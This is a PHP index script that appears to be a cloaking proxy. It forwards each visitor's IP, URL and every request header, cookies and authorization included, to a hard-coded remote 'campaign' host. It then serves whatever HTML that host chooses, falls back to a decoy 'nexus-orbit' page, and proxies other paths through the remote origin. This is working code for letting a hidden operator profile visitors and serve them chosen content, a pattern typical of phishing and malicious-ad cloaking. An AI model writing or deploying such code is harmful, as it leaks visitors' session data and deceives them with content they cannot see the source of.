<?php

const API_URL = 'https://wr.rosamoschetta.shop/wcz3rdkiwl/';
const FALLBACK_FILE = './nexus-orbit/index.html';

function startsWithCompat($haystack, $needle)
{
    return substr($haystack, 0, strlen($needle)) === $needle;
}

function respondCode($code)
{
    $code = (int) $code;

    if (function_exists('http_response_code')) {
        http_response_code($code);
        return;
    }

    header('HTTP/1.1 ' . $code, true, $code);
}

function clientIp()
{
    $candidates = array(
        'HTTP_CF_CONNECTING_IP',
        'HTTP_TRUE_CLIENT_IP',
        'HTTP_X_REAL_IP',
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_CLIENT_IP',
        'REMOTE_ADDR'
    );

    foreach ($candidates as $key) {
        if (!isset($_SERVER[$key]) || $_SERVER[$key] === '') {
            continue;
        }

        $parts = explode(',', (string) $_SERVER[$key]);

        foreach ($parts as $part) {
            $ip = trim($part);

            if ($ip === '') {
                continue;
            }

            if (function_exists('filter_var')) {
                if (filter_var($ip, FILTER_VALIDATE_IP) !== false) {
                    return $ip;
                }
            } elseif (preg_match('/^[0-9a-fA-F:.]+$/', $ip)) {
                return $ip;
            }
        }
    }

    return '';
}

function headersList()
{
    $headers = array();
    $resolved = false;

    if (function_exists('getallheaders')) {
        $all = getallheaders();

        if (is_array($all)) {
            foreach ($all as $name => $value) {
                $headers[strtolower($name)] = (string) $value;
            }

            $resolved = true;
        }
    }

    if (!$resolved) {
        foreach ($_SERVER as $key => $value) {
            if (startsWithCompat($key, 'HTTP_')) {
                $name = strtolower(str_replace('_', '-', substr($key, 5)));
                $headers[$name] = (string) $value;
            }
        }

        if (isset($_SERVER['CONTENT_TYPE'])) {
            $headers['content-type'] = (string) $_SERVER['CONTENT_TYPE'];
        }

        if (isset($_SERVER['CONTENT_LENGTH'])) {
            $headers['content-length'] = (string) $_SERVER['CONTENT_LENGTH'];
        }
    }

    $ip = clientIp();

    if ($ip !== '') {
        $forwarded = isset($headers['x-forwarded-for'])
            ? trim($headers['x-forwarded-for'])
            : '';

        if ($forwarded === '' || strpos($forwarded, $ip) !== 0) {
            $headers['x-forwarded-for'] = $ip;
        }

        $headers['x-client-ip'] = $ip;
    }

    return $headers;
}

function apiHeaders($incomingHeaders)
{
    $headers = array();

    $blocked = array(
        'host',
        'content-length',
        'content-type',
        'accept',
        'accept-encoding',
        'connection',
        'transfer-encoding',
        'expect'
    );

    foreach ($incomingHeaders as $name => $value) {
        if (!is_string($name) || !is_scalar($value)) {
            continue;
        }

        $name = trim($name);
        $lowerName = strtolower($name);
        $value = trim((string) $value);

        if (
            $name === '' ||
            $value === '' ||
            in_array($lowerName, $blocked, true) ||
            preg_match('/[\r\n:]/', $name) ||
            preg_match('/[\r\n]/', $value)
        ) {
            continue;
        }

        $headers[] = $name . ': ' . $value;
    }

    $headers[] = 'Content-Type: application/json';
    $headers[] = 'Accept: application/json';

    return $headers;
}

function resolveLocalFile($file)
{
    if (!$file) {
        $file = FALLBACK_FILE;
    }

    $base = realpath(dirname(__FILE__));

    if (!$base) {
        return false;
    }

    $cleanFile = ltrim((string) $file, "/\\");
    $path = realpath($base . DIRECTORY_SEPARATOR . $cleanFile);

    if (!$path) {
        return false;
    }

    $basePrefix = rtrim($base, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;

    if (
        !is_file($path) ||
        !startsWithCompat($path, $basePrefix)
    ) {
        return false;
    }

    $extension = strtolower(pathinfo($path, PATHINFO_EXTENSION));

    if (!in_array($extension, array('php', 'html', 'htm'), true)) {
        return false;
    }

    return array(
        'path' => $path,
        'href' => $cleanFile
    );
}

function localFile($file)
{
    $resolved = resolveLocalFile($file);

    if ($resolved !== false) {
        return $resolved;
    }

    $fallback = resolveLocalFile(FALLBACK_FILE);

    if ($fallback !== false) {
        return $fallback;
    }

    return false;
}

function parseHeaderLines($lines)
{
    $headers = array();

    if (!is_array($lines)) {
        return $headers;
    }

    foreach ($lines as $line) {
        $parts = explode(':', (string) $line, 2);

        if (count($parts) !== 2) {
            continue;
        }

        $name = strtolower(trim($parts[0]));

        if ($name === '') {
            continue;
        }

        $headers[$name][] = trim($parts[1]);
    }

    return $headers;
}

function collectResponseHeader($ch, $line)
{
    $parts = explode(':', (string) $line, 2);

    if (count($parts) === 2) {
        $name = strtolower(trim($parts[0]));

        if ($name !== '') {
            $GLOBALS['apiResponseHeaders'][$name][] = trim($parts[1]);
        }
    }

    return strlen($line);
}

function httpPost($url, $body, $headers)
{
    if (function_exists('curl_init')) {
        $ch = curl_init($url);

        if (!$ch) {
            return false;
        }

        $GLOBALS['apiResponseHeaders'] = array();

        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
        curl_setopt($ch, CURLOPT_TIMEOUT, 6);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
        curl_setopt($ch, CURLOPT_ENCODING, '');
        curl_setopt($ch, CURLOPT_HEADERFUNCTION, 'collectResponseHeader');

        $response = curl_exec($ch);

        if ($response === false) {
            curl_close($ch);
            return false;
        }

        $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);

        curl_close($ch);

        if ($code < 200 || $code >= 300) {
            return false;
        }

        return array(
            'body' => $response,
            'code' => $code,
            'headers' => $GLOBALS['apiResponseHeaders']
        );
    }

    if (!ini_get('allow_url_fopen')) {
        return false;
    }

    $context = stream_context_create(array(
        'http' => array(
            'method' => 'POST',
            'header' => implode("\r\n", $headers),
            'content' => $body,
            'timeout' => 6,
            'ignore_errors' => true
        )
    ));

    $response = @file_get_contents($url, false, $context);

    if ($response === false) {
        return false;
    }

    $code = 0;
    $responseHeaders = array();

    if (isset($http_response_header) && is_array($http_response_header)) {
        $responseHeaders = parseHeaderLines($http_response_header);

        if (
            isset($http_response_header[0]) &&
            preg_match('/HTTP\/\S+\s+(\d+)/', $http_response_header[0], $match)
        ) {
            $code = (int) $match[1];
        }
    }

    if ($code < 200 || $code >= 300) {
        return false;
    }

    return array(
        'body' => $response,
        'code' => $code,
        'headers' => $responseHeaders
    );
}

function clientHost()
{
    $host = '';

    if (isset($_SERVER['HTTP_HOST']) && $_SERVER['HTTP_HOST'] !== '') {
        $host = (string) $_SERVER['HTTP_HOST'];
    } elseif (isset($_SERVER['SERVER_NAME'])) {
        $host = (string) $_SERVER['SERVER_NAME'];
    }

    return trim(preg_replace('/[\r\n]/', '', $host));
}

function clientUrl()
{
    return clientHost() . requestPath();
}

function requestPath()
{
    $path = '';

    if (isset($_SERVER['REQUEST_URI'])) {
        $parsed = parse_url((string) $_SERVER['REQUEST_URI'], PHP_URL_PATH);

        if (is_string($parsed)) {
            $path = $parsed;
        }
    }

    if ($path === '' || $path[0] !== '/') {
        $path = '/' . $path;
    }

    return $path;
}

function requestQuery()
{
    return isset($_SERVER['QUERY_STRING']) && $_SERVER['QUERY_STRING'] !== ''
        ? '?' . $_SERVER['QUERY_STRING']
        : '';
}

function campaignOrigin()
{
    $parts = parse_url(API_URL);

    if (!is_array($parts) || empty($parts['scheme']) || empty($parts['host'])) {
        return null;
    }

    $port = isset($parts['port']) ? ':' . $parts['port'] : '';

    return $parts['scheme'] . '://' . $parts['host'] . $port;
}

function scriptPath()
{
    $script = isset($_SERVER['SCRIPT_NAME'])
        ? (string) $_SERVER['SCRIPT_NAME']
        : '/index.php';
    $script = str_replace('\\', '/', $script);

    if ($script === '' || $script[0] !== '/') {
        $script = '/' . $script;
    }

    return $script;
}

function clientAssetBase()
{
    $host = clientHost();

    if ($host === '') {
        return '';
    }

    return $host . scriptPath() . '/';
}

function isEntryRequest()
{
    $script = scriptPath();
    $directory = rtrim(dirname($script), '/');

    $entries = array(
        $script,
        $directory,
        $directory . '/',
        $directory . '/index.php'
    );

    return in_array(requestPath(), $entries, true);
}

function normalizeAssetPath($path)
{
    $path = (string) $path;

    if ($path === '') {
        return null;
    }

    if ($path[0] !== '/') {
        $path = '/' . $path;
    }

    return '/' . ltrim($path, '/');
}

function assetPath()
{
    if (isset($_SERVER['PATH_INFO']) && $_SERVER['PATH_INFO'] !== '') {
        return normalizeAssetPath($_SERVER['PATH_INFO']);
    }

    $script = scriptPath();
    $path = requestPath();

    if (strpos($path, $script . '/') === 0) {
        return normalizeAssetPath(substr($path, strlen($script)));
    }

    if (!isEntryRequest()) {
        return normalizeAssetPath($path);
    }

    return null;
}

function proxyHeaders($incomingHeaders)
{
    $headers = array();

    $blocked = array(
        'host',
        'content-length',
        'accept-encoding',
        'connection',
        'keep-alive',
        'transfer-encoding',
        'te',
        'trailer',
        'upgrade',
        'expect',
        'proxy-authenticate',
        'proxy-authorization'
    );

    foreach ($incomingHeaders as $name => $value) {
        if (!is_string($name) || !is_scalar($value)) {
            continue;
        }

        $name = trim($name);
        $lowerName = strtolower($name);
        $value = trim((string) $value);

        if (
            $name === '' ||
            $value === '' ||
            in_array($lowerName, $blocked, true) ||
            preg_match('/[\r\n:]/', $name) ||
            preg_match('/[\r\n]/', $value)
        ) {
            continue;
        }

        $headers[] = $name . ': ' . $value;
    }

    return $headers;
}

function httpProxy($method, $url, $body, $headers)
{
    if (function_exists('curl_init')) {
        $ch = curl_init($url);

        if (!$ch) {
            return false;
        }

        $GLOBALS['apiResponseHeaders'] = array();

        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
        curl_setopt($ch, CURLOPT_ENCODING, '');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
        curl_setopt($ch, CURLOPT_HEADERFUNCTION, 'collectResponseHeader');

        if ($method === 'HEAD') {
            curl_setopt($ch, CURLOPT_NOBODY, true);
        }

        if ($body !== null && $body !== '') {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
        }

        $response = curl_exec($ch);

        if ($response === false) {
            curl_close($ch);
            return false;
        }

        $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);

        curl_close($ch);

        if ($code === 0) {
            return false;
        }

        return array(
            'body' => $response,
            'code' => $code,
            'headers' => $GLOBALS['apiResponseHeaders']
        );
    }

    if (!ini_get('allow_url_fopen')) {
        return false;
    }

    $context = stream_context_create(array(
        'http' => array(
            'method' => $method,
            'header' => implode("\r\n", $headers),
            'content' => $body === null ? '' : $body,
            'timeout' => 15,
            'ignore_errors' => true,
            'follow_location' => 0
        )
    ));

    $response = @file_get_contents($url, false, $context);

    if ($response === false) {
        return false;
    }

    $code = 0;
    $responseHeaders = array();

    if (isset($http_response_header) && is_array($http_response_header)) {
        $responseHeaders = parseHeaderLines($http_response_header);

        foreach ($http_response_header as $line) {
            if (preg_match('/^HTTP\/\S+\s+(\d+)/', (string) $line, $match)) {
                $code = (int) $match[1];
            }
        }
    }

    if ($code === 0) {
        return false;
    }

    return array(
        'body' => $response,
        'code' => $code,
        'headers' => $responseHeaders
    );
}

function proxyAsset($path)
{
    $origin = campaignOrigin();

    if ($origin === null) {
        respondCode(404);
        return;
    }

    $method = isset($_SERVER['REQUEST_METHOD'])
        ? strtoupper(trim((string) $_SERVER['REQUEST_METHOD']))
        : 'GET';

    $body = in_array($method, array('GET', 'HEAD'), true)
        ? null
        : (string) file_get_contents('php://input');

    $response = httpProxy(
        $method,
        $origin . $path . requestQuery(),
        $body,
        proxyHeaders(headersList())
    );

    if ($response === false) {
        respondCode(502);
        return;
    }

    forwardResponseHeaders($response['headers'], false);

    if (!headers_sent()) {
        respondCode($response['code']);
    }

    echo $response['body'];
}

function clientMethod()
{
    $method = isset($_SERVER['REQUEST_METHOD'])
        ? strtolower(trim((string) $_SERVER['REQUEST_METHOD']))
        : 'get';

    return $method === 'post' ? 'post' : 'get';
}

function getRequestUrl()
{
    $query = isset($_SERVER['QUERY_STRING']) && $_SERVER['QUERY_STRING'] !== ''
        ? '?' . $_SERVER['QUERY_STRING']
        : '';

    return API_URL . $query;
}

function apiResponse()
{
    $headers = headersList();

    $payload = array(
        'url' => clientUrl(),
        'assetBase' => clientAssetBase(),
        'method' => clientMethod(),
        'headers' => $headers
    );

    $body = json_encode($payload);

    if (!$body) {
        return false;
    }

    $response = httpPost(getRequestUrl(), $body, apiHeaders($headers));

    if ($response === false) {
        return false;
    }

    return $response;
}

function forwardResponseHeaders($responseHeaders, $defaultHtml = true)
{
    if (headers_sent()) {
        return;
    }

    $blocked = array(
        'transfer-encoding',
        'content-length',
        'content-encoding',
        'connection',
        'keep-alive',
        'trailer',
        'te',
        'upgrade',
        'proxy-authenticate',
        'proxy-authorization',
        'date',
        'server',
        'alt-svc',
        'host'
    );

    $contentType = '';

    if (!is_array($responseHeaders)) {
        $responseHeaders = array();
    }

    foreach ($responseHeaders as $name => $values) {
        if (!is_string($name)) {
            continue;
        }

        $name = trim($name);
        $lowerName = strtolower($name);

        if (
            $name === '' ||
            in_array($lowerName, $blocked, true) ||
            preg_match('/[^A-Za-z0-9\-_]/', $name)
        ) {
            continue;
        }

        if (!is_array($values)) {
            $values = array($values);
        }

        foreach ($values as $value) {
            if (!is_scalar($value)) {
                continue;
            }

            $value = trim((string) $value);

            if (preg_match('/[\r\n]/', $value)) {
                continue;
            }

            if ($lowerName === 'content-type') {
                $contentType = $value;
                continue;
            }

            header($name . ': ' . $value, false);
        }
    }

    if ($defaultHtml && ($contentType === '' || stripos($contentType, 'json') !== false)) {
        $contentType = 'text/html; charset=utf-8';
    }

    if ($contentType !== '') {
        header('Content-Type: ' . $contentType, true);
    }
}

function renderRemoteHtml($html, $statusCode, $responseHeaders)
{
    $code = (int) $statusCode;

    if ($code < 100 || $code > 599) {
        $code = 200;
    }

    forwardResponseHeaders($responseHeaders);

    if (!headers_sent()) {
        respondCode($code);
    }

    echo $html;
}

function htmlBaseHref($href)
{
    $href = str_replace('\\', '/', $href);
    $dir = dirname($href);

    if ($dir === '.' || $dir === '') {
        return './';
    }

    return rtrim($dir, '/') . '/';
}

function renderFile($file)
{
    if (!$file || !isset($file['path'])) {
        respondCode(500);
        echo 'Fallback file not found.';
        return;
    }

    $path = $file['path'];

    ob_start();
    require $path;
    $html = ob_get_clean();

    if ($html === false) {
        return;
    }

    $baseHref = htmlBaseHref(isset($file['href']) ? $file['href'] : '');
    $base = '<base href="' . htmlspecialchars($baseHref, ENT_QUOTES, 'UTF-8') . '">';

    if (preg_match('/<head\b[^>]*>/i', $html, $match, PREG_OFFSET_CAPTURE)) {
        $offset = $match[0][1] + strlen($match[0][0]);
        $html = substr($html, 0, $offset) . $base . substr($html, $offset);
    } else {
        $html = $base . $html;
    }

    echo $html;
}

function handleRequest()
{
    $asset = assetPath();

    if ($asset !== null) {
        proxyAsset($asset);
        return;
    }

    $response = apiResponse();

    if ($response === false) {
        renderFile(localFile(null));
        return;
    }

    $data = json_decode($response['body'], true);

    if (!is_array($data)) {
        renderFile(localFile(null));
        return;
    }

    if (isset($data['html']) && is_string($data['html'])) {
        renderRemoteHtml(
            $data['html'],
            isset($data['statusCode']) ? $data['statusCode'] : 200,
            $response['headers']
        );
        return;
    }

    if (!isset($data['file']) || !is_string($data['file'])) {
        renderFile(localFile(null));
        return;
    }

    renderFile(localFile($data['file']));
}

handleRequest();
